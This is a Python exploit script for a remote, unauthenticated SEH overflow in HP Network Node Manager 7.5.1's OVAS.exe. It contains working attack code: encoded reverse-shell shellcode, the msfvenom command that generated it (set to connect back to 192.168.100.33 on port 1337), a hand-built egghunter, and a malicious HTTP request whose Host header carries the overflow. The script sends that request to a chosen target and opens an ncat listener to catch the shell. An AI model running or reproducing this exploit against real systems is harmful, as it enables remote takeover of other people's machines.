#!/usr/bin/python
import sys
import time
import struct
import socket
import subprocess

#----------------------------------------------------------------------------------#
# Exploit: HP NNM 7.5.1 - 'OVAS.exe' Unauthenticated Overflow (SEH)                #
# OS Tested: Windows .NET Server (Build 3790, Service Pack 1) x86                  #
# Author: Amonsec                                                                  #
# Date: Sun, 17 September 2017                                                     #
#----------------------------------------------------------------------------------#
# Thanks:                                                                          #
#       muts       (https://www.offensive-security.com/)                           #
#       Ch3rn0byl  (http://ch3rn0byl.com/)                                         #
####################################################################################
_RED = '\x1b[1;31m'
_BLU = '\x1b[1;34m'
_GRE = '\x1b[1;32m'
_RST = '\x1b[0;0;0m'

successMessage = lambda x: '{}[+]{} {}'.format(_GRE, _RST, x)
errorMessage = lambda x: '{}[-]{} {}'.format(_RED, _RST, x)
infoMessage = lambda x: '{}[*]{} {}'.format(_BLU, _RST, x)

print infoMessage('HP NNM 7.5.1 - \'OVAS.exe\' Unauthenticated Overflow (SEH)')
print infoMessage('Original exploit author: {}muts{}'.format(_RED, _RST))
print infoMessage('Author: {}Amonsec{}\n'.format(_RED, _RST))

if len(sys.argv) < 3:
	print infoMessage('Usage: python {} <rhost> <rport>'.format(sys.argv[0]))
	print infoMessage('Usage Examples: ')
	print '\t python {} 192.168.100.85 7510'.format(sys.argv[0])
	sys.exit(-1)
else:
	rhost = sys.argv[1]
	rport = int(sys.argv[2])

'''
Shellcode generation:
msfvenom --platform windows -p windows/shell_reverse_tcp LPORT=1337 \
LHOST=192.168.100.33 BufferRegister=EDI -f raw -e x86/alpha_mixed -b '\x00\x0a\x0d' -a x86 EXITFUNC=thread
'''
shellcode = ''
shellcode += 'WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIkLXhorwpC0gpq'
shellcode += 'pK9heP1iP3TLKpPFPlKBr6lLKf2dTlK42ex6oNWSz5vDqIonLul1qqlc2DlUpo1jo'
shellcode += 'vmfa9WyrKBF2BwnkRrb0nkaZGLLKpLDQPxXcrhgqhQpQNkF9gPvaN3nkg9vxKSfZ1'
shellcode += 'YNkp4nk6axVfQkOLliQzodM5QYWdxM0CE9f5ScMIhukQm5trU8dpXNkf8EtWqkcBF'
shellcode += 'LKVlRknk68glfajsnk4DNkfaN0k9QT7TFD3k1KqqF9PZrqyoYpsosoPZlKUBZKlMq'
shellcode += 'MSXtswBEPc0E8SG2StraOCdu8PL2W7VEWKOiEX8j07qgpC0wYXDSdV0e85ymPPk7p'
shellcode += 'yoYEBprprpv0spf070PPax8jDOIOkPYokelWQz7uU8o0mx54ta58tBePc5uilIHfP'
shellcode += 'jB0PVV7e8J9Y5PtE1ion5k5yPPt4Lyo2n7xt5jL58HpOEI2rvioZuE8E3BM54s0Ni'
shellcode += 'HcpWpWSgp1hvrJr2F9CfM2KMCVKw74gTelVa5QNmG4a4DPo6S0g4QD2prv66qF2f0'
shellcode += 'VbnCf0V1CV62HbYXL5oOvKOKeLIyppNV62fiotpRHs8owWm50yozuMk9p5MUzgzU8'
shellcode += 'mvmEMmomKOHUulS61lWzk0IkKPBUEUOKPGwc1bbO0jGpRsyo9EAA'
shellcode += '\xcc' * 500

'''
Original egghunter in Python format:
egghunter = ''
egghunter += '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58'
egghunter += '\xcd\x2e\x3c\x05\x5a\x74\xef\xb8'
egghunter += '\x41\x6d\x6f\x6e'
egghunter += '\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
'''
egghunter = ''                                     
egghunter += '\x25' + struct.pack('<L', 0x554e4d4a) # and eax, 554e4d4a
egghunter += '\x25' + struct.pack('<L', 0x2a313235) # and eax, 2a313235
egghunter += '\x54'                                 # push esp
egghunter += '\x58'                                 # pop eax
##############################################################################################
egghunter += '\x2d' + struct.pack('<L', 0x55554d66) # sub eax, 55554d66  | 
egghunter += '\x2d' + struct.pack('<L', 0x55554b66) # sub eax, 55554b66  | Stack 
egghunter += '\x2d' + struct.pack('<L', 0x5555506a) # sub eax, 5555506a  | alignment
egghunter += '\x50'                                 # push eax           |
egghunter += '\x5c'                                 # pop esp            |
##############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 8/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x55555521) # sub eax, 55555521  | of your
egghunter += '\x2d' + struct.pack('<L', 0x55555421) # sub eax, 55555421  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x6D556F49) # sub eax, 6D556F49  |
egghunter += '\x50'                                 # push eax           | \x75\xe7\xff\xe7
###############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 7/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x75612171) # sub eax, 75612171  | of your
egghunter += '\x2d' + struct.pack('<L', 0x75612171) # sub eax, 75612171  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x6553476F) # sub eax, 6553476F  |
egghunter += '\x50'                                 # push eax           | \xaf\x75\xea\xaf
##############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 6/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x03707f7f) # sub eax, 03707f7f  | of your
egghunter += '\x2d' + struct.pack('<L', 0x01020909) # sub eax, 01020909  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x01020909) # sub eax, 01020909  |
egghunter += '\x50'                                 # push eax           | \x6f\x6e\x8b\xfa
##############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 5/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x5f7f4509) # sub eax, 5f7f4509  | of your
egghunter += '\x2d' + struct.pack('<L', 0x31370105) # sub eax, 31370105  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x02080103) # sub eax, 02080103  |
egghunter += '\x50'                                 # push eax           | \xef\xb8\x41\x6d
##############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 4/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x2d317333) # sub eax, 2d317333  | of your
egghunter += '\x2d' + struct.pack('<L', 0x2d313333) # sub eax, 2d313333  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x3143545e) # sub eax, 3143545e  |
egghunter += '\x50'                                 # push eax           | \x3c\x05\x5a\x74
##############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 3/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x45773144) # sub eax, 45773144  | of your
egghunter += '\x2d' + struct.pack('<L', 0x45473145) # sub eax, 45473145  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x46744575) # sub eax, 46744575  |
egghunter += '\x50'                                 # push eax           | \x02\x58\xcd\x2e
##############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 2/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x32323252) # sub eax, 32323252  | of your
egghunter += '\x2d' + struct.pack('<L', 0x31313131) # sub eax, 31313131  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x324a5a6e) # sub eax, 324a5a6e  |
egghunter += '\x50'                                 # push eax           | \x0f\x42\x52\x6a
##############################################################################################
egghunter += '\x25' + struct.pack('<L', 0x4a4d4e55) # and eax, 554e4d4a  |
egghunter += '\x25' + struct.pack('<L', 0x3532312a) # and eax, 2a313235  | 1/8 4 bytes
egghunter += '\x2d' + struct.pack('<L', 0x44772d31) # sub eax, 44772d31  | of your
egghunter += '\x2d' + struct.pack('<L', 0x44772d31) # sub eax, 44772d31  | egghunter
egghunter += '\x2d' + struct.pack('<L', 0x77472438) # sub eax, 77472438  |
egghunter += '\x50'                                 # push eax           | \x66\x81\xca\xff
##############################################################################################

'''
The first stage
'''
exploit = ''
exploit += '\x4c' * 3377                   # Junk
exploit += struct.pack('<L', 0x21774c4c)   # Jump over the return address
exploit += struct.pack('<L', 0x6d356c6e)   # POP POP RET address
exploit += '\x47' * 32                     # Padding
exploit += egghunter                       # Painful egghunter
exploit += '\x41' * 100                    # Padding

'''
Build the malicious HTTP request
'''
header = ''
header += 'GET /topology/homeBaseView HTTP/1.1\r\n'
header += 'Host: ' + exploit + ':7510\r\n'
header += 'Current-Type: application/x-www-form-urlencode\r\n'
header += 'User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n'
header += 'Content-Length: 1048580\r\n\r\n'
header += 'AmonAmon'
header += shellcode

'''
Exploit information
'''
print infoMessage('Remote target: {}:{}'.format(rhost, rport))
print infoMessage('Exploit lenght: {} bytes'.format(len(exploit)))
print infoMessage('Shelcode lenght: {} bytes'.format(len(shellcode) - 500))
print infoMessage('Egghunter lenght: {} bytes'.format(len(egghunter)))
print infoMessage('Hunted tag: {}Amon{}\n'.format(_RED, _RST))

'''
Trying to exploit the HP NNM v7.5.1 vulnerability
'''
try:
	print infoMessage('Trying to establish a connect with the target')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((rhost, rport))
	print successMessage('Connection successfully established!')

	print infoMessage('Trying to send the evil HTTP request ...')
	s.send(header)
	s.close()
	print successMessage('Evil HTTP request successfully sent!')

	print infoMessage('Waiting the reverse shell...\n')
	subprocess.call(['ncat -lvvp 1337'], shell=True)

except socket.error as error:
	s.close()

	print errorMessage('Ooouuups! Something goes wrong!')
	print errorMessage('Try later?!')
	sys.exit(1)
